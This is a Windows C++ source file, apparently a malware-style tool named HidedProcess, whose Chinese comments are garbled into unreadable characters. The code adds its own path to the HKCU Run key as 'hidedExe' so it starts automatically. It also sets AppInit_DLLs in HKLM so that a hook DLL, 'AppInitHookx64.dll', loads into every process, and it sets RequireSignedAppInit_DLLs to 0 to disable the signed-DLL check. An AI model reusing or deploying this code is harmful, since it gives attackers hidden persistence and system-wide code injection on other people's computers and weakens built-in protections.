// HidedProcess.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <Windows.h>
#include <iostream>
#include <string>
using namespace std;
void globalHook();
void autostart();
int main(int argc, char** argv)
{
	globalHook();
	autostart();
	std::cout <<"���Գ���!!!";
	getchar();
    return 0;
}

// ���򿪻��Զ�����
void autostart()
{
	HKEY hKey;
	string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//1���ҵ�ϵͳ��������  
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///��������       
	{
		//2���õ������������ȫ·��
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3���ж�ע������Ƿ��Ѿ�����
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, nullptr, "hidedExe", RRF_RT_REG_SZ, 0, strDir, &nLength);
		//4���Ѿ�����
		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
		{
			//5�����һ����Key,������ֵ��"GISRestart"��Ӧ�ó������֣����Ӻ�׺.exe�� 
			RegSetValueEx(hKey, "hidedExe", 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1)*sizeof(TCHAR));

			//6���ر�ע���
			RegCloseKey(hKey);
		}
	}
}
//Global Hook
void globalHook()
{
	HKEY hKey;
	string strRegPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	//1���ҵ�ϵͳ��������  
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///��������       
	{
		//2���õ������������ȫ·��
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//�滻��HOOK DLL
		string str(strExeFullDir);
		size_t pos = str.find_last_of("\\");
		string hookPath;
		if (pos > 0)
		{
			hookPath = str.replace(str.begin() + pos + 1, str.end(), "AppInitHookx64.dll");
		}
		//3���ж�ע������Ƿ��Ѿ�����
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, nullptr, "AppInit_DLLs", RRF_RT_REG_SZ, 0, strDir, &nLength);
		//4���Ѿ�����
		if (result != ERROR_SUCCESS || _tcscmp(hookPath.c_str(), strDir) != 0)
		{
			//5�����һ����Key,������ֵ
			RegSetValueEx(hKey, "AppInit_DLLs", 0, REG_SZ, (LPBYTE)hookPath.c_str(), hookPath.length());
		}
		

		DWORD v = 0;
		DWORD type = 0;
		result = RegGetValue(hKey, nullptr, "LoadAppInit_DLLs", RRF_RT_REG_DWORD, 0, &v, &nLength);
		//4���Ѿ�����
		if (result != ERROR_SUCCESS || v != 1)
		{
			DWORD v1 = 1;
			//5�����һ����Key,������ֵ 
			RegSetValueEx(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&v1, 4);
		}


		result = RegGetValue(hKey, nullptr, "RequireSignedAppInit_DLLs", RRF_RT_REG_DWORD, 0, &v, &nLength);
		//4���Ѿ�����
		if (result != ERROR_SUCCESS || v != 0)
		{
			DWORD v1 = 0;
			//5�����һ����Key,������ֵ 
			RegSetValueEx(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&v1, 4);
		}
		//6���ر�ע���
		RegCloseKey(hKey);
	}
}
